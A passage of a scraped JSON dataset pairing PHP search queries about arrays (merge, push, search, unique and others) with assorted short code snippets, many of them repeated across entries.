    "description": "$my_array = ['foo' => 1, 'hello' => 'world']; $allowed  = ['foo', 'bar']; $filtered = array_filter(     $my_array,     function ($key) use ($allowed) {         return in_array($key, $allowed);     },     ARRAY_FILTER_USE_KEY );\n?php $data= [     0 => [1, 'test1'],     1 => [2, 'test2'],     2 => [3, 'test3'], ];  $ids = array_map(function($item) {     return $item[0]; }, $data);  var_dump($ids);\n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 434,
    "keyword": null,
    "link": null,
    "title": " array find php",
    "description": " <?php $array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1; ?>  \narray_search ( mixed $needle , array $haystack , bool $strict = false ) : int|string|false  <?php $array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1; ?>\n$userdb=Array (     (0) => Array         (             (uid) => '100',             (name) => 'Sandra Shush',             (url) => 'urlof100'         ),      (1) => Array         (             (uid) => '5465',             (name) => 'Stefanie Mcmohn',             (pic_square) => 'urlof100'         ),      (2) => Array         (             (uid) => '40489',             (name) => 'Michael',             (pic_square) => 'urlof40489'         ) );  simply u can use this  $key = array_search(40489, array_column($userdb, 'uid'));\n$userdb = array(     array(         'uid' => '100',         'name' => 'Sandra Shush',         'pic_square' => 'urlof100'     ),     array(         'uid' => '5465',         'name' => 'Stefanie Mcmohn',         'pic_square' => 'urlof100'     ),     array(         'uid' => '40489',         'name' => 'Michael',         'pic_square' => 'urlof40489'     ) ); \n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 435,
    "keyword": null,
    "link": null,
    "title": " array flat php",
    "description": "$c = [\"a\" => [\"x\" => \"X\", \"y\" => \"Y\"], \"b\" => [\"p\" => \"P\", \"q\" => \"Q\"]]; print_r(array_merge(...array_values($c)));  Array (     [x] => X     [y] => Y     [p] => P     [q] => Q ) \narray_merge(...$a); \n$a = [[10, 20], [30, 40]]; $b = [[\"x\" => \"X\", \"y\" => \"Y\"], [\"p\" => \"P\", \"q\" => \"Q\"]];  print_r(array_merge(...$a)); print_r(array_merge(...$b));  Array (     [0] => 10     [1] => 20     [2] => 30     [3] => 40 ) Array (     [x] => X     [y] => Y     [p] => P     [q] => Q ) \n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 436,
    "keyword": null,
    "link": null,
    "title": " array intersect",
    "description": "array_intersect(array $array, array ...$arrays): array  /* Returns an array containing all of the values in array whose     values exist in all of the parameters. */\n$array1 = [1, 2]; $array2 = [2, 3, 4]; $commonValue = array_intersect($array1, $array2); //$commonValue = 2 // If you have X number of arrays you can do: $array1 = [1, 2]; $array2 = [2, 3, 4]; $arrayOfArrays = [$array1, $array2]; $commonValue = array_intersect(...$arrayOfArrays);\n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 437,
    "keyword": null,
    "link": null,
    "title": " array intersect php",
    "description": "<?php $a1 = array(\"a\"=>\"red\", \"b\"=>\"green\", \"c\"=>\"blue\", \"d\"=>\"yellow\"); $a2 = array(\"e\"=>\"red\", \"f\"=>\"green\", \"g\"=>\"blue\");  $result = array_intersect($a1, $a2); print_r($result); //Array ( [a] => red [b] => green [c] => blue )\n$array1 = [1, 2]; $array2 = [2, 3, 4]; $commonValue = array_intersect($array1, $array2); //$commonValue = 2 // If you have X number of arrays you can do: $array1 = [1, 2]; $array2 = [2, 3, 4]; $arrayOfArrays = [$array1, $array2]; $commonValue = array_intersect(...$arrayOfArrays);\n<?php     $array1 = array(\"a\" => \"verde\", \"vermelho\", \"azul\");     $array2 = array(\"b\" => \"verde\", \"amarelo\", \"vermelho\");     $result = array_intersect($array1, $array2);     print_r($result); // Array ( [a] => verde [0] => vermelho )  ?>\n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 438,
    "keyword": null,
    "link": null,
    "title": " array key exists in php",
    "description": "// Here's our fruity array $fruits = ['apple', 'pear', 'banana'];  // Use it in an `if` statement if (array_key_exists(\"banana\", $fruits)) {  // Do stuff because `banana` exists }  // Store it for later use $exists = array_key_exists(\"peach\", $fruits);\n <?php $search_array = array('first' => null, 'second' => 4);  // returns false isset($search_array['first']);  // returns true array_key_exists('first', $search_array); ?>  \n<!DOCTYPE html> <html lang=\"en\">  <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title> </head>  <body>     <?php     if (array_key_exists('btn1', $_POST)) {         button1();     }     if (array_key_exists('btn2', $_POST)) {         button2();     }     function button1()     {         echo 'btn1 is clicked boom!';     }     function button2()     {         echo 'btn2 is clicked wohoo!';     }     ?>     <br><br>      <form action=\"\" method=\"post\">         <button name=\"btn1\">click here</button>         <button name=\"btn2\">click here</button>     </form> </body> </html>\nPHP function key_exists($key, array $array) bool ------------------------------------------------ Checks if the given key or index exists in the array. The name of this function is array_key_exists() in PHP > 4.0.6.  Parameters: int|string--$key--Value to check. array--$array--An array with keys to check.    Returns:true on success or false on failure.\n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 439,
    "keyword": null,
    "link": null,
    "title": " array key exists vs isset",
    "description": "$a = array('key1' => 'text', 'key2' => null);  isset($a['key1']);             // true array_key_exists('key1', $a);  // true  isset($a['key2']);             // false array_key_exists('key2', $a);  // true\n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 440,
    "keyword": null,
    "link": null,
    "title": " array key value php",
    "description": "array_keys ($array); // It returns an array // more informations at https://www.php.net/manual/fr/function.array-keys.php (fr)\n$array = array(0 => 100, \"cor\" => \"vermelho\"); print_r(array_keys($array));  $array = array(\"azul\", \"vermelho\", \"verde\", \"azul\", \"azul\"); print_r(array_keys($array, \"azul\"));  $array = array(\"cor\"     => array(\"azul\", \"vermelho\", \"verde\"),                \"tamanho\" => array(\"pequeno\", \"medio\", \"grande\")); print_r(array_keys($array)); \n<?php $age=array(\"Peter\"=>\"35\",\"Ben\"=>\"37\",\"Joe\"=>\"43\"); foreach($age as $x=>$x_value)   {   echo \"Key=\" . $x . \", Value=\" . $x_value;   echo \"<br>\";   } ?>\n$healthStructureData = [             'product' => $product,             'website_data' => $website_data,             'total_keywords' => $total_keywords,             'certificate_status' => $certificate_status,             'total_user_websites' => $total_user_websites,         ];  foreach ($healthStructureData as $key => $value) {   $$key = $value; }\n$id = 1; $age = 2;     $sort = \"id\"; // or \"age\";     $Key = $$sort; $arr = array($Key => 'string');  print_r($arr);\nforeach($bigArray as $array){         foreach($array as $key=>$value){         echo $key;     } }   #If if helps you give it Thumbs up\n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 441,
    "keyword": null,
    "link": null,
    "title": " array last in laravel 8",
    "description": "use Illuminate\\Support\\Arr;  $array = [100, 200, 300, 110];  $last = Arr::last($array, function ($value, $key) {     return $value >= 150; });  // 300\n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 442,
    "keyword": null,
    "link": null,
    "title": " array loop function php",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\nforeach (array as $value){    //code to be executed;    print(\"value : $value\"); }   foreach (array as  $key => $value){    //code to be executed;    print(\"key[$key] => $value\"); } \n$ar = ['Rudi', 'Morie', 'Halo', 'Miki'];  for ($i=0, $len=count($ar); $i<$len; $i++) {     echo \"$ar[$i] \\n\"; } /* Rudi  Morie  Halo  Miki  */\nforeach (array_expression as $value)     statement foreach (array_expression as $key => $value)     statement\n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 443,
    "keyword": null,
    "link": null,
    "title": " array marge in php",
    "description": "/* Array merge is basically use to merge the two array data. */    <?php $a1=array(\"red\",\"green\"); $a2=array(\"blue\",\"green\",\"yellow\"); print_r(array_merge($a1,$a2)); ?>    /* Output: Array ( [0] => red [1] => green [2] => blue [3] => green [4] => yellow ) */    <?php $a1=array(\"a\"=>\"red\",\"b\"=>\"green\"); $a2=array(\"c\"=>\"blue\",\"b\"=>\"yellow\"); print_r(array_merge($a1,$a2)); ?>  /* Output: Array ( [a] => red [b] => yellow [c] => blue ) */    /* In above example you can check the difference in output  it takes all values of both array in final output, but not in associative array you can check. because one value gets overwritten by same key reference in both array. */ \n<?php $a1=array(\"red\",\"green\"); $a2=array(\"blue\",\"yellow\"); print_r(array_merge($a1,$a2)); ?>\n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 444,
    "keyword": null,
    "link": null,
    "title": " array merge in php",
    "description": " <?php $array1 = array(\"color\" => \"red\", 2, 4); $array2 = array(\"a\", \"b\", \"color\" => \"green\", \"shape\" => \"trapezoid\", 4); $result = array_merge($array1, $array2); print_r($result); ?> Array (     [color] => green     [0] => 2     [1] => 4     [2] => a     [3] => b     [shape] => trapezoid     [4] => 4 ) \n<?php   $array1 = [       \"color\" => \"green\"   ];   $array2 = [       \"color\" => \"red\",        \"color\" => \"blue\"   ];   $result = array_merge($array1, $array2); ?>  // $result [     \"color\" => \"green\"     \"color\" => \"red\",      \"color\" => \"blue\" ]\n<?php  $array1 = array('key1' => 'test1', 'key2' => 'test2'); $array2 = array('key3' => 'test3', 'key4' => 'test4');  $resultArray = array_merge($array1, $array2);  // If you have numeric or numeric like keys, array_merge will  // reset the keys to 0 and start numbering from there  $resultArray = $array1 + $array2;  // Using the addition operator will allow you to preserve your keys, // however any duplicate keys will be ignored.\n$output = array_merge($array1, $array2);\n/* Array merge is basically use to merge the two array data. */    <?php $a1=array(\"red\",\"green\"); $a2=array(\"blue\",\"green\",\"yellow\"); print_r(array_merge($a1,$a2)); ?>    /* Output: Array ( [0] => red [1] => green [2] => blue [3] => green [4] => yellow ) */    <?php $a1=array(\"a\"=>\"red\",\"b\"=>\"green\"); $a2=array(\"c\"=>\"blue\",\"b\"=>\"yellow\"); print_r(array_merge($a1,$a2)); ?>  /* Output: Array ( [a] => red [b] => yellow [c] => blue ) */    /* In above example you can check the difference in output  it takes all values of both array in final output, but not in associative array you can check. because one value gets overwritten by same key reference in both array. */ \n<?php $a1=array(\"red\",\"green\"); $a2=array(\"blue\",\"yellow\"); print_r(array_merge($a1,$a2)); ?>\n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 445,
    "keyword": null,
    "link": null,
    "title": " array merge php",
    "description": " <?php $array1 = array(\"color\" => \"red\", 2, 4); $array2 = array(\"a\", \"b\", \"color\" => \"green\", \"shape\" => \"trapezoid\", 4); $result = array_merge($array1, $array2); print_r($result); ?> Array (     [color] => green     [0] => 2     [1] => 4     [2] => a     [3] => b     [shape] => trapezoid     [4] => 4 ) \n<?php $array1    = array(\"color\" => \"red\", 2, 4); $array2    = array(\"a\", \"b\", \"color\" => \"green\", \"shape\" => \"trapezoid\", 4); $result = array_merge($array1, $array2); print_r($result); /* Array (     [color] => green     [0] => 2     [1] => 4     [2] => a     [3] => b     [shape] => trapezoid     [4] => 4 ) */\n<?php   $array1 = [       \"color\" => \"green\"   ];   $array2 = [       \"color\" => \"red\",        \"color\" => \"blue\"   ];   $result = array_merge($array1, $array2); ?>  // $result [     \"color\" => \"green\"     \"color\" => \"red\",      \"color\" => \"blue\" ]\n<?php  $array1 = array('key1' => 'test1', 'key2' => 'test2'); $array2 = array('key3' => 'test3', 'key4' => 'test4');  $resultArray = array_merge($array1, $array2);  // If you have numeric or numeric like keys, array_merge will  // reset the keys to 0 and start numbering from there  $resultArray = $array1 + $array2;  // Using the addition operator will allow you to preserve your keys, // however any duplicate keys will be ignored.\n$output = array_merge($array1, $array2);\n/* Array merge is basically use to merge the two array data. */    <?php $a1=array(\"red\",\"green\"); $a2=array(\"blue\",\"green\",\"yellow\"); print_r(array_merge($a1,$a2)); ?>    /* Output: Array ( [0] => red [1] => green [2] => blue [3] => green [4] => yellow ) */    <?php $a1=array(\"a\"=>\"red\",\"b\"=>\"green\"); $a2=array(\"c\"=>\"blue\",\"b\"=>\"yellow\"); print_r(array_merge($a1,$a2)); ?>  /* Output: Array ( [a] => red [b] => yellow [c] => blue ) */    /* In above example you can check the difference in output  it takes all values of both array in final output, but not in associative array you can check. because one value gets overwritten by same key reference in both array. */ \n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 446,
    "keyword": null,
    "link": null,
    "title": " array merge recursive in php",
    "description": "// array_merge_recursive function in php  <?php $a1=array(color=>\"red\",\"green\"); $a2=array(color=>\"blue\",\"yellow\"); print_r(array_merge_recursive($a1,$a2)); ?>  //OUTPUT Array ( [color] => Array ( [0] => red [1] => blue ) [0] => green [1] => yellow )\n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 447,
    "keyword": null,
    "link": null,
    "title": " array php",
    "description": "<?php    $array = array(\"size\" => \"XL\", \"color\" => \"gold\");  print_r(array_values($array));  ?>\n <?php $array = array(     \"foo\" => \"bar\",     \"bar\" => \"foo\", );  // as of PHP 5.4 $array = [     \"foo\" => \"bar\",     \"bar\" => \"foo\", ]; ?>  \n#Arrays  <?php     #array is a variable that holds multiple values     /*     Three types of arrays         - Indexed         - associative         - Multi-dimensional     */     // Indexed array is the most common and easiest     $people = array('Kevin', 'Jeremy ', 'Sara');     $ids = array(23, 55, 12);     $cars = ['Honda', ' Toyota', 'Ford'];  // also an array     //add to an array     $cars[3] = ' Audi';     // you can use empty brackets and it will be added to the last one     $cars[] = ' Chevy';      echo $people[1];     echo $ids[1];     echo $cars[1];         echo $cars[3];     echo $cars[4];     echo count($cars);     //you can also print the entire array     print_r($cars);     //to look at data type     echo var_dump($cars);      //Associative Arrays key pairs     $people1 = array('Kevin' => 35, 'Jeremy' => 23, 'Sara' => 19);     $ids1 = array(23 => 'Kevin', 55 => 'Jeremy', 12 => 'Sara');     echo $people1['Kevin'];     echo $ids1[23];     //add to these types of arrays     $people1['Jill'] = 44;     echo $people1['Jill'];     print_r($people1);     var_dump($people1);      //Multi-Dimensional Arrays aka an array within an array       $cars2 = array(         array('Honda',20,10),         array('Toyota',30,20),         array('Ford',23,12)     );      echo $cars2[1][0];       ?>\n<?php $array = array(     \"foo\" => \"bar\",     \"bar\" => \"foo\", );  // as of PHP 5.4 $array = [     \"foo\" => \"bar\",     \"bar\" => \"foo\", ]; ?> \n <?php $array = array(     \"foo\" => \"bar\",     42    => 24,     \"multi\" => array(          \"dimensional\" => array(              \"array\" => \"foo\"          )     ) );  var_dump($array[\"foo\"]); var_dump($array[42]); var_dump($array[\"multi\"][\"dimensional\"][\"array\"]); ?>  \nArray (     [0] => Array         (             [name] => phone             [price] => 700         )      [1] => Array         (             [name] => note             [price] => 20         )      [2] => Array         (             [name] => book             [price] => 49         )  ) \n",
    "reg_date": "2021-10-12T10:12:45.000Z"
  },
  {
    "id": 448,
    "keyword": null,
    "link": null,
    "title": " array push",
    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\n$array[$key] = $value; // or $array[] = $value; // or array_push($array, [ mixed $... ]);\narray_push($cart, 13); \n <?php $cesta = array(\"laranja\", \"morango\"); array_push($cesta, \"melancia\", \"batata\"); print_r($cesta); ?>  \n// The array_push() function inserts one or more elements to the end of an array.  $a=array(\"red\",\"green\"); array_push($a,\"blue\",\"yellow\"); print_r($a);\narray_push($array,$value);\n",
    "reg_date": "2021-10-12T10:12:46.000Z"
  },
  {
    "id": 449,
    "keyword": null,
    "link": null,
    "title": " array push foreach php",
    "description": "$items = array(); foreach($group_membership as $username) {  $items[] = $username; }  print_r($items);\n// array_push ( array &$array [, mixed $... ] ) : int // array_push() treats array as a stack, and pushes the passed variables onto the end of array. The length of array increases by the number of variables pushed. Has the same effect as:  <?php $array[] = $var; ?> // repeated for each passed value. // Note: If you use array_push() to add one element to the array, it's better to use $array[] = because in that way there is no overhead of calling a function.\n",
    "reg_date": "2021-10-12T10:12:46.000Z"
  },
  {
    "id": 450,
    "keyword": null,
    "link": null,
    "title": " array push in php",
    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\n$array[$key] = $value; // or $array[] = $value; // or array_push($array, [ mixed $... ]);\narray_push($cart, 13); \n$fruits = [\"apple\", \"banana\"]; // array_push() function inserts one or more elements to the end of an array array_push($fruits, \"orange\");  // If you use array_push() to add one element to the array, it's better to use // $fruits[] = because in that way there is no overhead of calling a function. $fruits[] = \"orange\";  // output: Array ( [0] => apple [1] => banana [2] => orange )\n <?php $cesta = array(\"laranja\", \"morango\"); array_push($cesta, \"melancia\", \"batata\"); print_r($cesta); ?>  \n<?php // Insert \"blue\" and \"yellow\" to the end of an array:   $a=array(\"red\",\"green\"); array_push($a,\"blue\",\"yellow\"); print_r($a); ?>\n",
    "reg_date": "2021-10-12T10:12:46.000Z"
  },
  {
    "id": 451,
    "keyword": null,
    "link": null,
    "title": " array push object php",
    "description": "$myArray = [];  array_push($myArray, (object)[         'key1' => 'someValue',         'key2' => 'someValue2',         'key3' => 'someValue3', ]);  return $myArray;\n$myArray = array(\"name\" => \"my name\"); echo json_encode($myArray);\n",
    "reg_date": "2021-10-12T10:12:46.000Z"
  },
  {
    "id": 452,
    "keyword": null,
    "link": null,
    "title": " array push php",
    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\n$array[$key] = $value; // or $array[] = $value; // or array_push($array, [ mixed $... ]);\narray_push($cart, 13); \n$fruits = [\"apple\", \"banana\"]; // array_push() function inserts one or more elements to the end of an array array_push($fruits, \"orange\");  // If you use array_push() to add one element to the array, it's better to use // $fruits[] = because in that way there is no overhead of calling a function. $fruits[] = \"orange\";  // output: Array ( [0] => apple [1] => banana [2] => orange )\n <?php $cesta = array(\"laranja\", \"morango\"); array_push($cesta, \"melancia\", \"batata\"); print_r($cesta); ?>  \n// array_push ( array &$array [, mixed $... ] ) : int // array_push() treats array as a stack, and pushes the passed variables onto the end of array. The length of array increases by the number of variables pushed. Has the same effect as:  <?php $array[] = $var; ?> // repeated for each passed value. // Note: If you use array_push() to add one element to the array, it's better to use $array[] = because in that way there is no overhead of calling a function.\n",
    "reg_date": "2021-10-12T10:12:46.000Z"
  },
  {
    "id": 453,
    "keyword": null,
    "link": null,
    "title": " array random php",
    "description": "$items = array(1, 2, 3, 4, 5); echo $items[array_rand($items)];\n<?php //array_rand ( array $array [, int $num = 1 ] )  $input = array(\"Neo\", \"Morpheus\", \"Trinity\", \"Cypher\", \"Tank\"); $rand_keys = array_rand($input, 2); echo $input[$rand_keys[0]] . \"\\n\"; echo $input[$rand_keys[1]] . \"\\n\"; ?>  \n$array = [\"a\", \"b\", \"c\"]; $random = $array[ Rand(0, count($array)-1) ];  echo $random; // a or b or c\n<?php $indexedArray = array(\"red\", \"blue\", \"green\", \"black\"); echo $indexedArray[array_rand($indexedArray)]; ?>\n$colors=[\"red\",\"blue\",\"green\",\"orange\"]; echo $colors[array_rand($colors)];//green (or any color randomly)\n<?php $indexedArray = array(\"red\", \"blue\", \"green\", \"black\");  echo $indexedArray[0] . \"<br>\"; echo $indexedArray[1] . \"<br><br>\";  $array_random = array_rand($indexedArray, 2);  echo $indexedArray[$array_random[0]] . \"<br>\"; echo $indexedArray[$array_random[1]] . \"<br>\"; ?>\n",
    "reg_date": "2021-10-12T10:12:46.000Z"
  },
  {
    "id": 454,
    "keyword": null,
    "link": null,
    "title": " array reverse php",
    "description": "$array= array(1,2,3,4,5); $reversedArray = array_reverse($array);  var_dump($y);\n <?php $input  = array(\"php\", 4.0, array(\"green\", \"red\")); $reversed = array_reverse($input); $preserved = array_reverse($input, true);  print_r($input); print_r($reversed); print_r($preserved); ?>  \narray_reverse($array);\n<?php $i_arr = [\"html\", \"css\", \"javascript\", \"php\", \"vue\", \"react\"];  echo \"<pre>\"; print_r($i_arr); echo \"</pre>\";  $reverse = array_reverse($i_arr, false); $preserve = array_reverse($i_arr, true);  echo \"<pre>\"; print_r($reverse); echo \"</pre>\";  echo \"<pre>\"; print_r($preserve); echo \"</pre>\"; ?>\n",
    "reg_date": "2021-10-12T10:12:46.000Z"
  },
  {
    "id": 455,
    "keyword": null,
    "link": null,
    "title": " array search",
    "description": " <?php $array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1; ?>  \n// array demo  public $gender = array(   1 => 'Male',   2 => 'Female',   3 => 'Other', );  $gen = 1;  if ($gen == array_search('Male', $this->gender)) {   $gender = __d('member', 'male');  } elseif ($gen  == array_search('Female', $this->gender)) {   $gender = __d('member', 'female');  }  \n",
    "reg_date": "2021-10-12T10:12:46.000Z"
  },
  {
    "id": 456,
    "keyword": null,
    "link": null,
    "title": " array search in php",
    "description": "//array_search $result = array_search(\"apple\", $fruit_array); // return index or false  //in_array $result = in_array(\"apple\", $fruit_array); // return true or false\n <?php $array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1; ?>  \n<?php $a = [ 'Canceled' => 1, 'Traded / Filled'=> 2, '(Not used currently)'=> 3, 'Transit'=> 4, 'Rejected'=> 5, 'Pending'=> 6, ]; echo array_search(\"5\",$a); ?> \n// array demo  public $gender = array(   1 => 'Male',   2 => 'Female',   3 => 'Other', );  $gen = 1;  if ($gen == array_search('Male', $this->gender)) {   $gender = __d('member', 'male');  } elseif ($gen  == array_search('Female', $this->gender)) {   $gender = __d('member', 'female');  }  \n$userdb = array(     array(         'uid' => '100',         'name' => 'Sandra Shush',         'pic_square' => 'urlof100'     ),     array(         'uid' => '5465',         'name' => 'Stefanie Mcmohn',         'pic_square' => 'urlof100'     ),     array(         'uid' => '40489',         'name' => 'Michael',         'pic_square' => 'urlof40489'     ) ); \nPHP function array_search(mixed $needle, array $haystack, bool $strict = false) false|int|string ---------------------------------------------------------------------------------------------    Searches the array for a given value and returns the first corresponding key if successful.    Parameters: mixed--$needle--The searched value.If needle is a string, the comparison is done in a case-sensitive manner. array--$haystack--The array. bool--$strict--[optional] If the third parameter strict is set to true then the array_search function will also check the types of the needle in the haystack.    Returns: the key for needle if it is found in the array, false otherwise.    If needle is found in haystack more than once, the first matching key is returned. To return the keys for all matching values, use array_keys with the optional search_value parameter instead.\n",
    "reg_date": "2021-10-12T10:12:46.000Z"
  },
  {
    "id": 457,
    "keyword": null,
    "link": null,
    "title": " array search multidimensional php",
    "description": "$key = array_search('100', array_column($userdb, 'uid')); \nfunction find_customer_mobile($customers, $mobile) {     foreach($customers as $index => $cust) {         if($cust['mobile'] == $mobile) return $index;     }     return FALSE; }\n  /**    * PHP Search an Array for multiple key / value pairs    */    function multi_array_search($array, $search) {     // Create the result array     $result = array();      // Iterate over each array element     foreach ($array as $key => $value){        // Iterate over each search condition       foreach ($search as $k => $v){          // If the array element does not meet the search condition then continue to the next element         if (!isset($value[$k]) || $value[$k] != $v){           continue 2;         }       }       // Add the array element's key to the result array       $result[] = $key;     }      // Return the result array     return $result;   }    // Output the result   print_r(multi_array_search($list_of_phones, array()));    // Array ( [0] => 0 [1] => 1 )    // Output the result   print_r(multi_array_search($list_of_phones, array('Manufacturer' => 'Apple')));    // Array ( [0] => 0 )    // Output the result   print_r(multi_array_search($list_of_phones, array('Manufacturer' => 'Apple', 'Model' => 'iPhone 6')));    // Array ( ) \n",
    "reg_date": "2021-10-12T10:12:46.000Z"
  },
  {
    "id": 458,
    "keyword": null,
    "link": null,
    "title": " array should not be empty php",
    "description": "if (empty($array)) {      // list is empty. }\n$arr = array();  if(!empty($arr)){   echo \"not empty\"; } else  {   echo \"empty\"; } \n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 459,
    "keyword": null,
    "link": null,
    "title": " array splice php",
    "description": "$items = ['banana', 'apple'];  unset($items[0]);  var_dump($items); // ['apple']\n<?php $input = array(\"red\", \"green\", \"blue\", \"yellow\"); array_splice($input, 2); var_dump($input);  $input = array(\"red\", \"green\", \"blue\", \"yellow\"); array_splice($input, 1, -1); var_dump($input);  $input = array(\"red\", \"green\", \"blue\", \"yellow\"); array_splice($input, 1, count($input), \"orange\"); var_dump($input);  $input = array(\"red\", \"green\", \"blue\", \"yellow\"); array_splice($input, -1, 1, array(\"black\", \"maroon\")); var_dump($input); ?>\n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 460,
    "keyword": null,
    "link": null,
    "title": " array sum in multidimensional array php",
    "description": "<?php $items = [     ['label' => 'cake', 'name' => 'Cake', 'price' => 150],     ['label' => 'pizza', 'name' => 'Pizza', 'price' => 250],     ['label' => 'puff', 'name' => 'Veg Puff', 'price' => 20],     ['label' => 'samosa', 'name' => 'Samosa', 'price' => 14] ];  $arrSum = array_sum(array_column($items, 'price', 'name')); print \"Sum of Array : \".$arrSum.\"<br/>\"; ?> \n<?php  $items = [     ['label' => 'cake', 'name' => 'Cake', 'price' => 150],     ['label' => 'pizza', 'name' => 'Pizza', 'price' => 250],     ['label' => 'puff', 'name' => 'Veg Puff', 'price' => 20],     ['label' => 'samosa', 'name' => 'Samosa', 'price' => 14] ];  $arrSum = array_sum(array_column($items, 'price', 'name')); print \"Sum of Array : \".$arrSum.\"<br/>\"; ?>\n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 461,
    "keyword": null,
    "link": null,
    "title": " array to object php",
    "description": "$object = (object) $array;\n$object = json_decode(json_encode($array), FALSE); \n$arrayResult = array_map(function($array){     return (object)$array; }, $yourOrinalArray);\n$object = (object)$array; \n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 462,
    "keyword": null,
    "link": null,
    "title": " array to string separated by comma php",
    "description": "$arr = array ( 0 => \"lorem\", 1 => \"ipsum\", 2 => \"dolor\");  $str = implode (\", \", $arr);\n$string = implode(', ', $tags);\n $tags = implode(', ', array('tag1','tag2','tag3','tag4'));\n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 463,
    "keyword": null,
    "link": null,
    "title": " array unicode php",
    "description": "header('Content-Type: text/html; charset=utf-8');\nutf8_encode ( string $data )\n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 464,
    "keyword": null,
    "link": null,
    "title": " array unique",
    "description": " <?php $input = array(\"a\" => \"green\", \"red\", \"b\" => \"green\", \"blue\", \"red\"); $result = array_unique($input); print_r($result); ?>  Array (     [a] => green     [0] => red     [1] => blue )\n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 465,
    "keyword": null,
    "link": null,
    "title": " array unique multidimensional php",
    "description": "<?php     function super_unique($array,$key)     {        $temp_array = [];        foreach ($array as &$v) {            if (!isset($temp_array[$v[$key]]))            $temp_array[$v[$key]] =& $v;        }        $array = array_values($temp_array);        return $array;      }   $arr=\"\"; $arr[0]['id']=0; $arr[0]['titel']=\"ABC\"; $arr[1]['id']=1; $arr[1]['titel']=\"DEF\"; $arr[2]['id']=2; $arr[2]['titel']=\"ABC\"; $arr[3]['id']=3; $arr[3]['titel']=\"XYZ\";  echo \"<pre>\"; print_r($arr); echo \"unique*********************<br/>\"; print_r(super_unique($arr,'titel'));  ?> \n$uniquePids = array_unique(array_map(function ($i) { return $i['pid']; }, $holder));\nArray (     [0] => Array         (             [id] => 1             [value] => 111         )       [1] => Array         (             [id] => 2             [value] => 222         )       [2] => Array         (             [id] => 3             [value] => 333         )       [3] => Array         (             [id] => 1             [value] => 111         )   ) \n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 466,
    "keyword": null,
    "link": null,
    "title": " array unique php",
    "description": "<?php $fruits_list = array('Orange',  'Apple', ' Banana', 'Cherry', ' Banana'); $result = array_unique($fruits_list); print_r($result); ?>    Output:  Array ( [0] => Orange [1] => Apple [2] => Banana [3] => Cherry ) \n <?php $input = array(\"a\" => \"green\", \"red\", \"b\" => \"green\", \"blue\", \"red\"); $result = array_unique($input); print_r($result); ?>  Array (     [a] => green     [0] => red     [1] => blue )\n<?php     // Syntax: array_unique(array $array, int $flags = SORT_STRING): array     // Desc: Removes duplicate values from an array     $arr = Array(\"red\", \"red\", \"green\", \"blue\", \"blue\", \"white\");     echo \"<pre>\";     print_r($arr);     echo \"</pre> <br><br>\";          $arrUnique = array_unique($arr);      echo \"<pre>\";     print_r($arrUnique);     echo \"</pre> <br><br>\";      /* -------- output -----------     Array     (         [0] => red         [1] => red         [2] => green         [3] => blue         [4] => blue         [5] => white     )          Array     (         [0] => red         [2] => green         [3] => blue         [5] => white     )     */ ?>\n$counts = array_count_values($array);             $duplicate_title  = array_filter($array, function ($value) use ($counts) {                 return $counts[$value] > 1;             });\nlet chars = ['A', 'B', 'A', 'C', 'B']; let uniqueChars = [...new Set(chars)];  console.log(uniqueChars); \n$input = array_map(\"unserialize\", array_unique(array_map(\"serialize\", $input)));\n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 467,
    "keyword": null,
    "link": null,
    "title": " array unshift php",
